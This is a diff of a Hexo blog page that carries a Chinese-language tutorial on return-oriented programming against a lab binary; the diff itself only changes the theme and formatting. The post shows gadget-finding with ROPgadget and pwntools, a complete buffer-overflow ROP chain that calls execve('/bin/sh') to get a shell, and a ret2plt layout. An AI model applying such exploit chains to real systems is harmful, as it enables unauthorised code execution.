@@ -6,6 +6,116 @@
     <meta name="keywords" content="Hexo Theme Redefine">
     
     <meta name="author" content="Tr0y2ooo">
+    
+    <!-- Completely eliminate flash of wrong theme -->
+    <script>
+        (function() {
+            const THEME_KEY = "REDEFINE-THEME-STATUS";
+            const DARK = "dark", LIGHT = "light";
+            
+            // Get preferred theme
+            function getTheme() {
+                try {
+                    const saved = localStorage.getItem(THEME_KEY);
+                    if (saved) {
+                        const { isDark } = JSON.parse(saved);
+                        return isDark ? DARK : LIGHT;
+                    }
+                } catch (e) {}
+                
+                return matchMedia("(prefers-color-scheme: dark)").matches ? DARK : LIGHT;
+            }
+            
+            // Apply theme to document
+            function applyTheme(theme) {
+                const isDark = theme === DARK;
+                const root = document.documentElement;
+                
+                // Set data attribute for CSS variables
+                root.setAttribute("data-theme", theme);
+                
+                // Set classes for compatibility
+                root.classList.add(theme);
+                root.classList.remove(isDark ? LIGHT : DARK);
+                root.style.colorScheme = theme;
+            }
+            
+            // Initial application
+            const theme = getTheme();
+            applyTheme(theme);
+            
+            // Listen for system preference changes
+            matchMedia("(prefers-color-scheme: dark)").addEventListener("change", ({ matches }) => {
+                // Only update if using system preference (no localStorage entry)
+                if (!localStorage.getItem(THEME_KEY)) {
+                    applyTheme(matches ? DARK : LIGHT);
+                }
+            });
+            
+            // Set body classes once DOM is ready
+            if (document.readyState !== "loading") {
+                document.body.classList.add(theme + "-mode");
+            } else {
+                document.addEventListener("DOMContentLoaded", () => {
+                    document.body.classList.add(theme + "-mode");
+                    document.body.classList.remove((theme === DARK ? LIGHT : DARK) + "-mode");
+                });
+            }
+        })();
+    </script>
+    
+    <!-- Critical CSS to prevent flash -->
+    <style>
+        :root[data-theme="dark"] {
+            --background-color: #202124;
+            --background-color-transparent: rgba(32, 33, 36, 0.6);
+            --second-background-color: #2d2e32;
+            --third-background-color: #34353a;
+            --third-background-color-transparent: rgba(32, 33, 36, 0.6);
+            --primary-color: #0066CC;
+            --first-text-color: #ffffff;
+            --second-text-color: #eeeeee;
+            --third-text-color: #bebec6;
+            --fourth-text-color: #999999;
+            --default-text-color: #bebec6;
+            --invert-text-color: #373D3F;
+            --border-color: rgba(255, 255, 255, 0.08);
+            --selection-color: #0066CC;
+            --shadow-color-1: rgba(255, 255, 255, 0.08);
+            --shadow-color-2: rgba(255, 255, 255, 0.05);
+        }
+        
+        :root[data-theme="light"] {
+            --background-color: #fff;
+            --background-color-transparent: rgba(255, 255, 255, 0.6);
+            --second-background-color: #f8f8f8;
+            --third-background-color: #f2f2f2;
+            --third-background-color-transparent: rgba(241, 241, 241, 0.6);
+            --primary-color: #0066CC;
+            --first-text-color: #16171a;
+            --second-text-color: #2f3037;
+            --third-text-color: #5e5e5e;
+            --fourth-text-color: #eeeeee;
+            --default-text-color: #373D3F;
+            --invert-text-color: #bebec6;
+            --border-color: rgba(0, 0, 0, 0.08);
+            --selection-color: #0066CC;
+            --shadow-color-1: rgba(0, 0, 0, 0.08);
+            --shadow-color-2: rgba(0, 0, 0, 0.05);
+        }
+        
+        body {
+            background-color: var(--background-color);
+            color: var(--default-text-color);
+        }
+        
+        /* Apply body classes as soon as DOM is ready */
+        :root[data-theme="dark"] body {
+            background-color: var(--background-color);
+            color: var(--default-text-color);
+        }
+    </style>
+    
     <!-- preconnect -->
     <link rel="preconnect" href="https://fonts.googleapis.com">
     <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
@@ -18,6 +128,9 @@
     <meta name="googlebot" content="index,follow">
     <meta name="revisit-after" content="1 days">
     
+    
+    
+        
         <meta name="description" content="ROP1先備知識bof、算offset、stack結構 outline what is rop how to find rop gadget how to make rop chain stack pivot new compiler exploit  ROP再幹嘛 現在的binary通常都會開NX，比較難用bof塞shellcode，這時候就要用ROP 用mprotect或mmap拿RWX RO">
 <meta property="og:type" content="article">
 <meta property="og:title" content="ROP">
@@ -71,7 +184,7 @@
 
     
         
-<link rel="stylesheet" href="/assets/build/styles.css">
+<link rel="stylesheet" href="/css/build/tailwind.css">
 
     
 
@@ -91,7 +204,7 @@
 
     <script id="hexo-configurations">
     window.config = {"hostname":"example.com","root":"/","language":"en"};
-    window.theme = {"articles":{"style":{"font_size":"16px","line_height":1.5,"image_border_radius":"14px","image_alignment":"center","image_caption":false,"link_icon":true,"title_alignment":"left","headings_top_spacing":{"h1":"3.2rem","h2":"2.4rem","h3":"1.9rem","h4":"1.6rem","h5":"1.4rem","h6":"1.3rem"}},"word_count":{"enable":true,"count":true,"min2read":true},"author_label":{"enable":true,"auto":false,"list":[]},"code_block":{"copy":true,"style":"mac","highlight_theme":{"light":"github","dark":"vs2015"},"font":{"enable":false,"family":null,"url":null}},"toc":{"enable":true,"max_depth":3,"number":false,"expand":true,"init_open":true},"copyright":{"enable":true,"default":"cc_by_nc_sa"},"lazyload":true,"recommendation":{"enable":false,"title":"推荐阅读","limit":3,"mobile_limit":2,"placeholder":"/images/wallhaven-wqery6-light.webp","skip_dirs":[]}},"colors":{"primary":"#A31F34","secondary":null,"default_mode":"light"},"global":{"fonts":{"chinese":{"enable":false,"family":null,"url":null},"english":{"enable":false,"family":null,"url":null},"title":{"enable":false,"family":null,"url":null}},"content_max_width":"1000px","sidebar_width":"210px","hover":{"shadow":true,"scale":false},"scroll_progress":{"bar":false,"percentage":true},"website_counter":{"url":"https://cn.vercount.one/js","enable":true,"site_pv":true,"site_uv":true,"post_pv":true},"single_page":true,"preloader":{"enable":false,"custom_message":null},"open_graph":true,"google_analytics":{"enable":false,"id":null}},"home_banner":{"enable":true,"style":"fixed","image":{"light":"/images/rem.jpg","dark":"/images/rem_dark.jpg"},"title":"‎‎‎‏‎‏‎‏","subtitle":{"text":null,"hitokoto":{"enable":false,"show_author":false,"api":"https://v1.hitokoto.cn"},"typing_speed":100,"backing_speed":80,"starting_delay":500,"backing_delay":1500,"loop":true,"smart_backspace":true},"text_color":{"light":"#fff","dark":"#d1d1b6"},"text_style":{"title_size":"2.8rem","subtitle_size":"1.5rem","line_height":1.2},"custom_font":{"enable":false,"family":null,"url":null},"social_links":{"enable":false,"style":"default","links":{"github":null,"instagram":null,"zhihu":null,"twitter":null,"email":null},"qrs":{"weixin":null}}},"plugins":{"feed":{"enable":false},"aplayer":{"enable":true,"type":"fixed","audios":[{"name":"幹你娘","artist":"DJ Jerry","url":"https://ssl-pixnet-tv.pixfs.net/user/leo4/1231657490.m4a","cover":"https://media.discordapp.net/attachments/850438898093785128/1262046151520161835/1720574532076.gif?ex=67340852&is=6732b6d2&hm=a84a4a8bdeae5d7d34f0a8a1ccc339a001a624eb6ff490d5fd18cb35e0a49b84&=","lrc":null}]},"mermaid":{"enable":false,"version":"9.3.0"}},"version":"2.7.3","navbar":{"auto_hide":false,"color":{"left":"#f78736","right":"#367df7","transparency":35},"width":{"home":"1200px","pages":"1000px"},"links":{"Home":{"path":"/","icon":"fa-regular fa-house"},"tags":{"path":"/tags/","icon":"fa-solid fa-tags"},"Archives":{"path":"/archives","icon":"fa-regular fa-archive"},"About":{"icon":"fa-regular fa-user","submenus":{"Me":"/about","Github":"https://github.com/EvanNotFound/hexo-theme-redefine","Blog":"https://ohevan.com"}}},"search":{"enable":false,"preload":true}},"page_templates":{"friends_column":2,"tags_style":"blur"},"home":{"sidebar":{"enable":true,"position":"left","first_item":"menu","announcement":null,"show_on_mobile":true,"links":{"Archives":{"path":"/archives","icon":"fa-regular fa-archive"},"Tags":{"path":"/tags","icon":"fa-regular fa-tags"},"Categories":{"path":"/categories","icon":"fa-regular fa-folder"}}},"article_date_format":"auto","excerpt_length":200,"categories":{"enable":true,"limit":3},"tags":{"enable":true,"limit":3,"Tags":null,"icon":"fa-solid fa-tags","path":"/tags/"}},"footerStart":"2022/8/17 11:45:14"};
+    window.theme = {"articles":{"style":{"font_size":"16px","line_height":1.5,"image_border_radius":"14px","image_alignment":"center","image_caption":false,"link_icon":true,"delete_mask":false,"title_alignment":"left","headings_top_spacing":{"h1":"3.2rem","h2":"2.4rem","h3":"1.9rem","h4":"1.6rem","h5":"1.4rem","h6":"1.3rem"}},"word_count":{"enable":true,"count":true,"min2read":true},"author_label":{"enable":true,"auto":false,"list":[]},"code_block":{"copy":true,"style":"mac","highlight_theme":{"light":"github","dark":"vs2015"},"font":{"enable":false,"family":null,"url":null}},"toc":{"enable":true,"max_depth":3,"number":false,"expand":true,"init_open":true},"copyright":{"enable":true,"default":"cc_by_nc_sa"},"lazyload":true,"pangu_js":false,"recommendation":{"enable":false,"title":"推荐阅读","limit":3,"mobile_limit":2,"placeholder":"/images/wallhaven-wqery6-light.webp","skip_dirs":[]}},"colors":{"primary":"#A31F34","secondary":null,"default_mode":"light"},"global":{"fonts":{"chinese":{"enable":false,"family":null,"url":null},"english":{"enable":false,"family":null,"url":null},"title":{"enable":false,"family":null,"url":null}},"content_max_width":"1000px","sidebar_width":"210px","hover":{"shadow":true,"scale":false},"scroll_progress":{"bar":false,"percentage":true},"website_counter":{"url":"https://cn.vercount.one/js","enable":true,"site_pv":true,"site_uv":true,"post_pv":true},"single_page":true,"preloader":{"enable":false,"custom_message":null},"side_tools":{"gear_rotation":true,"auto_expand":false},"open_graph":true,"google_analytics":{"enable":false,"id":null}},"home_banner":{"enable":true,"style":"fixed","image":{"light":"/images/rem.jpg","dark":"/images/rem_dark.jpg"},"title":"‎‎‎‏‎‏‎‏","subtitle":{"text":null,"hitokoto":{"enable":false,"show_author":false,"api":"https://v1.hitokoto.cn"},"typing_speed":100,"backing_speed":80,"starting_delay":500,"backing_delay":1500,"loop":true,"smart_backspace":true},"text_color":{"light":"#fff","dark":"#d1d1b6"},"text_style":{"title_size":"2.8rem","subtitle_size":"1.5rem","line_height":1.2},"custom_font":{"enable":false,"family":null,"url":null},"social_links":{"enable":false,"style":"default","links":{"github":null,"instagram":null,"zhihu":null,"twitter":null,"email":null},"qrs":{"weixin":null}}},"plugins":{"feed":{"enable":false},"aplayer":{"enable":true,"type":"fixed","audios":[{"name":"幹你娘","artist":"DJ Jerry","url":"https://ssl-pixnet-tv.pixfs.net/user/leo4/1231657490.m4a","cover":"https://media.discordapp.net/attachments/850438898093785128/1262046151520161835/1720574532076.gif?ex=67340852&is=6732b6d2&hm=a84a4a8bdeae5d7d34f0a8a1ccc339a001a624eb6ff490d5fd18cb35e0a49b84&=","lrc":null}]},"mermaid":{"enable":false,"version":"9.3.0"}},"version":"2.8.5","navbar":{"auto_hide":false,"color":{"left":"#f78736","right":"#367df7","transparency":35},"width":{"home":"1200px","pages":"1000px"},"links":{"Home":{"path":"/","icon":"fa-regular fa-house"},"tags":{"path":"/tags/","icon":"fa-solid fa-tags"},"Archives":{"path":"/archives","icon":"fa-regular fa-archive"},"About":{"icon":"fa-regular fa-user","submenus":{"Me":"/about","Github":"https://github.com/EvanNotFound/hexo-theme-redefine","Blog":"https://ohevan.com"}}},"search":{"enable":false,"preload":true}},"page_templates":{"friends_column":2,"tags_style":"blur"},"home":{"sidebar":{"enable":true,"position":"left","first_item":"menu","announcement":null,"show_on_mobile":true,"links":{"Archives":{"path":"/archives","icon":"fa-regular fa-archive"},"Tags":{"path":"/tags","icon":"fa-regular fa-tags"},"Categories":{"path":"/categories","icon":"fa-regular fa-folder"}}},"article_date_format":"auto","excerpt_length":200,"categories":{"enable":true,"limit":3},"tags":{"enable":true,"limit":3,"Tags":null,"icon":"fa-solid fa-tags","path":"/tags/"}},"footerStart":"2022/8/17 11:45:14"};
     window.lang_ago = {"second":"%s seconds ago","minute":"%s minutes ago","hour":"%s hours ago","day":"%s days ago","week":"%s weeks ago","month":"%s months ago","year":"%s years ago"};
     window.data = {"masonry":false};
   </script>
@@ -116,29 +229,26 @@
 <meta name="generator" content="Hexo 7.3.0"></head>
 
 
+
 <body>
-<div class="progress-bar-container">
-    
+	<div class="progress-bar-container">
+	
 
-    
-        <span class="pjax-progress-bar"></span>
-<!--        <span class="swup-progress-icon">-->
-<!--            <i class="fa-solid fa-circle-notch fa-spin"></i>-->
-<!--        </span>-->
-    
+	
+	<span class="pjax-progress-bar"></span>
+	<!--        <span class="swup-progress-icon">-->
+	<!--            <i class="fa-solid fa-circle-notch fa-spin"></i>-->
+	<!--        </span>-->
+	
 </div>
-
-
 
 <main class="page-container" id="swup">
 
-    
+	
 
-    <div class="main-content-container flex flex-col justify-between min-h-dvh">
-
-
-        <div class="main-content-header">
-            <header class="navbar-container px-6 md:px-12">
+	<div class="main-content-container flex flex-col justify-between min-h-dvh">
+		<div class="main-content-header">
+			<header class="navbar-container px-6 md:px-12">
     <div class="navbar-content transition-navbar ">
         <div class="left">
             
@@ -409,40 +519,37 @@
 </header>
 
 
-        </div>
+		</div>
 
-        <div class="main-content-body">
+		<div class="main-content-body transition-fade-up">
+			
 
-            
+			<div class="main-content">
+				<div class="post-page-container flex relative justify-between box-border w-full h-full">
+	<div class="article-content-container">
 
-            <div class="main-content">
+		<div class="article-title relative w-full">
+			
+			<div class="w-full flex items-center pt-6 justify-start">
+				<h1 class="article-title-regular text-second-text-color tracking-tight text-4xl md:text-6xl font-semibold px-2 sm:px-6 md:px-8 py-3">ROP</h1>
+			</div>
+			
+		</div>
 
-                
-                    <div class="post-page-container flex relative justify-between box-border w-full h-full">
-    <div class="article-content-container">
-
-        <div class="article-title relative w-full">
-            
-                <div class="w-full flex items-center pt-6 justify-start">
-                    <h1 class="article-title-regular text-second-text-color tracking-tight text-4xl md:text-6xl font-semibold px-2 sm:px-6 md:px-8 py-3">ROP</h1>
-                </div>
-            
-            </div>
-
-        
-            <div class="article-header flex flex-row gap-2 items-center px-2 sm:px-6 md:px-8">
-                <div class="avatar w-[46px] h-[46px] flex-shrink-0 rounded-medium border border-border-color p-[1px]">
-                    <img src="/images/personal.jpg">
-                </div>
-                <div class="info flex flex-col justify-between">
-                    <div class="author flex items-center">
-                        <span class="name text-default-text-color text-lg font-semibold">Troy</span>
-                        
-                            <span class="author-label ml-1.5 text-xs px-2 py-0.5 rounded-small text-third-text-color border border-shadow-color-1">Lv3</span>
-                        
-                    </div>
-                    <div class="meta-info">
-                        <div class="article-meta-info">
+		
+		<div class="article-header flex flex-row gap-2 items-center px-2 sm:px-6 md:px-8">
+			<div class="avatar w-[46px] h-[46px] flex-shrink-0 rounded-medium border border-border-color p-[1px]">
+				<img src="/images/personal.jpg">
+			</div>
+			<div class="info flex flex-col justify-between">
+				<div class="author flex items-center">
+					<span class="name text-default-text-color text-lg font-semibold">Troy</span>
+					
+					<span class="author-label ml-1.5 text-xs px-2 py-0.5 rounded-small text-third-text-color border border-shadow-color-1">Lv3</span>
+					
+				</div>
+				<div class="meta-info">
+					<div class="article-meta-info">
     <span class="article-date article-meta-item">
         <i class="fa-regular fa-pen-fancy"></i>&nbsp;
         <span class="desktop">2024-12-25 01:57</span>
@@ -508,16 +615,16 @@
     
 </div>
 
-                    </div>
-                </div>
-            </div>
-        
+				</div>
+			</div>
+		</div>
+		
 
-        
+		
 
 
-        <div class="article-content markdown-body px-2 sm:px-6 md:px-8 pb-8">
-            <h1 id="ROP1"><a href="#ROP1" class="headerlink" title="ROP1"></a>ROP1</h1><h2 id="先備知識"><a href="#先備知識" class="headerlink" title="先備知識"></a>先備知識</h2><p>bof、算offset、stack結構</p>
+		<div class="article-content markdown-body px-2 sm:px-6 md:px-8 pb-8">
+			<h1 id="ROP1"><a href="#ROP1" class="headerlink" title="ROP1"></a>ROP1</h1><h2 id="先備知識"><a href="#先備知識" class="headerlink" title="先備知識"></a>先備知識</h2><p>bof、算offset、stack結構</p>
 <h2 id="outline"><a href="#outline" class="headerlink" title="outline"></a>outline</h2><ul>
 <li>what is rop</li>
 <li>how to find rop gadget</li>
@@ -539,7 +646,7 @@
 </ul>
 <h2 id="ROPgadget"><a href="#ROPgadget" class="headerlink" title="ROPgadget"></a>ROPgadget</h2><p><code>$ ROPgadget --binary binary</code><br>跑完之後會跑出很多gadget，不一定是乾淨的，要自己判斷後面的指令會不會影響你要的結果</p>
 <p>–all : 可以篩掉重複的gadget<br>–depth : 找gadget的深度，下了之後會發現找的時間更久，gadget更長</p>
-<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">1 from pwn import *</span><br><span class="line">  2 context.arch = &quot;amd64&quot;</span><br><span class="line">  3</span><br><span class="line">  4 elf = ELF(&quot;./lab_rop1/rop1&quot;)</span><br><span class="line">  5</span><br><span class="line">  6 bytecode = elf.section(&quot;.text&quot;)</span><br><span class="line">  7</span><br><span class="line">  8 for i in range(len(bytecode)):</span><br><span class="line">  9     if bytecode[i] == 0xc3:</span><br><span class="line"> 10         for j in range(i-10,i):</span><br><span class="line"> 11             print(disasm(bytecode[j:i+1]))                               12</span><br><span class="line"> 13</span><br><span class="line"> 14</span><br><span class="line"> 15 a = &#x27;&#x27;&#x27;</span><br><span class="line"> 16 ret</span><br><span class="line"> 17 &#x27;&#x27;&#x27;</span><br><span class="line"> 18 a_asm = asm(a)</span><br><span class="line"> 19 print(a_asm)</span><br><span class="line"> 20 print(disasm(a_asm))</span><br></pre></td></tr></table></figure></div>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">1 from pwn import *</span><br><span class="line">  2 context.arch = &quot;amd64&quot;</span><br><span class="line">  3</span><br><span class="line">  4 elf = ELF(&quot;./lab_rop1/rop1&quot;)</span><br><span class="line">  5</span><br><span class="line">  6 bytecode = elf.section(&quot;.text&quot;)</span><br><span class="line">  7</span><br><span class="line">  8 for i in range(len(bytecode)):</span><br><span class="line">  9     if bytecode[i] == 0xc3:</span><br><span class="line"> 10         for j in range(i-10,i):</span><br><span class="line"> 11             print(disasm(bytecode[j:i+1]))                               12</span><br><span class="line"> 13</span><br><span class="line"> 14</span><br><span class="line"> 15 a = &#x27;&#x27;&#x27;</span><br><span class="line"> 16 ret</span><br><span class="line"> 17 &#x27;&#x27;&#x27;</span><br><span class="line"> 18 a_asm = asm(a)</span><br><span class="line"> 19 print(a_asm)</span><br><span class="line"> 20 print(disasm(a_asm))</span><br></pre></td></tr></table></figure></div>
 <p>手動找ret結尾的rop gadget，裡面的數字10就是往上找10byte</p>
 <h2 id="ROP-chain"><a href="#ROP-chain" class="headerlink" title="ROP chain"></a>ROP chain</h2><p><a href="syscall.sh">好用網站</a><br><img  
                      lazyload
@@ -598,7 +705,7 @@
 </ul>
 <p>可以開始串rop了<br>一開始先把filename塞進去rdi，所以在輸入name的時候，傳”&#x2F;bin&#x2F;sh”進去name(要注意傳進去要是byte的形式，所以要在字串前面加上b)<br><code>r.sendlineafter(b&quot;name?&quot;,b&quot;bin/sh&quot;)</code></p>
 <p>那現在stack上面就有”&#x2F;bin&#x2F;sh”這個字串了，還記得這個程式攻擊點是bufferoverflow，也就是第二個輸入的地方，那bof就是要先塞offset到return address，可以用ida看offset要塞多少，熟練的話可以直接看到v16[]的大小是0x10，return address佔8bytes，所以offset是0x18，那就可以開始組裝payload了~</p>
-<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch(<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line"></span><br><span class="line">r = process(<span class="string">&#x27;./rop1&#x27;</span>) <span class="comment"># 在本地跑</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 把剛剛找的gadget的address輸入進來</span></span><br><span class="line">g_pop_rax = <span class="number">0x44fd87</span></span><br><span class="line">g_pop_rdi = <span class="number">0x401f4f</span></span><br><span class="line">g_pop_rsi = <span class="number">0x409f7e</span></span><br><span class="line">g_pop_rdx_rbx = <span class="number">0x485bab</span></span><br><span class="line">g_syscall = <span class="number">0x401d04</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 先塞/bin/sh進去一開始要輸入name的地方</span></span><br><span class="line">r.sendlineafter(<span class="string">b&quot;name?&quot;</span>,<span class="string">b&quot;/bin/sh&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 再組裝payload</span></span><br><span class="line">p = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x18</span> <span class="comment"># 剛剛說過的offset</span></span><br><span class="line">p += p64(g_pop_rdi) + p64(<span class="number">0x4C7300</span>) <span class="comment"># 這邊就是把name的那個buffer(/bin/sh)的address塞進rdi</span></span><br><span class="line">p += p64(g_pop_rsi) + p64(<span class="number">0x0</span>) <span class="comment"># rsi塞0</span></span><br><span class="line">p += p64(g_pop_rdx_rbx) + p64(<span class="number">0x0</span>) + p64(<span class="number">0x0</span>) <span class="comment"># 這邊主要是rdx要塞0，但是找不到乾淨的pop rdx，最乾淨的gadget後面還有一個pop rbx，所以rbx也要塞0，後面才會加兩次</span></span><br><span class="line">p += p64(g_pop_rax) + p64(<span class="number">59</span>) <span class="comment"># rax塞59</span></span><br><span class="line">p += p64(g_syscall) <span class="comment"># 執行syscall</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 最後再送出payload</span></span><br><span class="line">r.sendlineafter(<span class="string">b&quot;vuln: &quot;</span>,p)</span><br><span class="line"></span><br><span class="line">r.interactive() <span class="comment"># 切換成可以互動的模式</span></span><br></pre></td></tr></table></figure></div>
+<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch(<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line"></span><br><span class="line">r = process(<span class="string">&#x27;./rop1&#x27;</span>) <span class="comment"># 在本地跑</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 把剛剛找的gadget的address輸入進來</span></span><br><span class="line">g_pop_rax = <span class="number">0x44fd87</span></span><br><span class="line">g_pop_rdi = <span class="number">0x401f4f</span></span><br><span class="line">g_pop_rsi = <span class="number">0x409f7e</span></span><br><span class="line">g_pop_rdx_rbx = <span class="number">0x485bab</span></span><br><span class="line">g_syscall = <span class="number">0x401d04</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 先塞/bin/sh進去一開始要輸入name的地方</span></span><br><span class="line">r.sendlineafter(<span class="string">b&quot;name?&quot;</span>,<span class="string">b&quot;/bin/sh&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 再組裝payload</span></span><br><span class="line">p = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x18</span> <span class="comment"># 剛剛說過的offset</span></span><br><span class="line">p += p64(g_pop_rdi) + p64(<span class="number">0x4C7300</span>) <span class="comment"># 這邊就是把name的那個buffer(/bin/sh)的address塞進rdi</span></span><br><span class="line">p += p64(g_pop_rsi) + p64(<span class="number">0x0</span>) <span class="comment"># rsi塞0</span></span><br><span class="line">p += p64(g_pop_rdx_rbx) + p64(<span class="number">0x0</span>) + p64(<span class="number">0x0</span>) <span class="comment"># 這邊主要是rdx要塞0，但是找不到乾淨的pop rdx，最乾淨的gadget後面還有一個pop rbx，所以rbx也要塞0，後面才會加兩次</span></span><br><span class="line">p += p64(g_pop_rax) + p64(<span class="number">59</span>) <span class="comment"># rax塞59</span></span><br><span class="line">p += p64(g_syscall) <span class="comment"># 執行syscall</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 最後再送出payload</span></span><br><span class="line">r.sendlineafter(<span class="string">b&quot;vuln: &quot;</span>,p)</span><br><span class="line"></span><br><span class="line">r.interactive() <span class="comment"># 切換成可以互動的模式</span></span><br></pre></td></tr></table></figure></div>
 
 <ul>
 <li><p>怎麼debug exploit?</p>
@@ -656,11 +763,11 @@
 </li>
 </ul>
 <p>為什麼一定找的到，因為有Function prologue and epilogue，就是不管你function寫什麼，一定會有這些code。<br>最後一定會有</p>
-<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">leave</span><br><span class="line">ret</span><br></pre></td></tr></table></figure></div>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">leave</span><br><span class="line">ret</span><br></pre></td></tr></table></figure></div>
 <p>可以快速的復原，回到原本的狀態，leave可以把原本開的<code>sub rsp, 10h</code>，把rsp拉回去，leave &#x3D;&#x3D; mov rsp, rbp; pop rbp;</p>
-<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">endbr64</span><br><span class="line">push rbp</span><br><span class="line">mov rbp, rsp</span><br><span class="line">sub rsp, 10h</span><br></pre></td></tr></table></figure></div>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">endbr64</span><br><span class="line">push rbp</span><br><span class="line">mov rbp, rsp</span><br><span class="line">sub rsp, 10h</span><br></pre></td></tr></table></figure></div>
 <p>10h不一定，反正開頭就會用這段程式碼去長出一個新的stack frame<br>endbr64是 control flow integrity，目的是防止惡意程式流程，他的機制就是例如要call rdi，跳過去的address也要是endbr64開頭，但目前好像沒有CPU有用到這個指令，所以是當作NOP的instruction來看。</p>
-<h2 id="ret2plt"><a href="#ret2plt" class="headerlink" title="ret2plt"></a>ret2plt</h2><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">0x4012b7: ret</span><br><span class="line">0x4011f9: pop rdi ; ret</span><br><span class="line">    0x404018: printf@got</span><br><span class="line">0x401060: printf@plt</span><br><span class="line">0x4012b7: ret</span><br><span class="line">0x4011fe: main</span><br></pre></td></tr></table></figure></div>
+<h2 id="ret2plt"><a href="#ret2plt" class="headerlink" title="ret2plt"></a>ret2plt</h2><div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">0x4012b7: ret</span><br><span class="line">0x4011f9: pop rdi ; ret</span><br><span class="line">    0x404018: printf@got</span><br><span class="line">0x401060: printf@plt</span><br><span class="line">0x4012b7: ret</span><br><span class="line">0x4011fe: main</span><br></pre></td></tr></table></figure></div>
 <ul>
 <li>0x4012b7: ret<ul>
 <li>為什麼最前面要放一個ret，因為printf這個function裡面需要對齊(Alignment)16的倍數(要看是什麼系統倍數不一定是16)，如果stack被我們用rop攪亂之後變成可能0x08，這時候就不會通過，會顯是有異常，所以要加上ret去做對齊。</li>
@@ -710,11 +817,11 @@
 </ul>
 <p>How PLT table &amp; Got table be used with dynamic linker<br>PLT table is an array,each element stores some assembly instruction<br>just like<br>GOT[0]:addr of .dynamic<br>GOT[1]:addr of reloc entries<br>GOT[2]:addr of dynamic linker<br>GOT[3]:<br>GOT[4]:address of PLT second instruction</p>
 
-        </div>
+		</div>
 
-        
-            <div class="post-copyright-info w-full my-8 px-2 sm:px-6 md:px-8">
-                <div class="article-copyright-info-container">
+		
+		<div class="post-copyright-info w-full my-8 px-2 sm:px-6 md:px-8">
+			<div class="article-copyright-info-container">
     <ul>
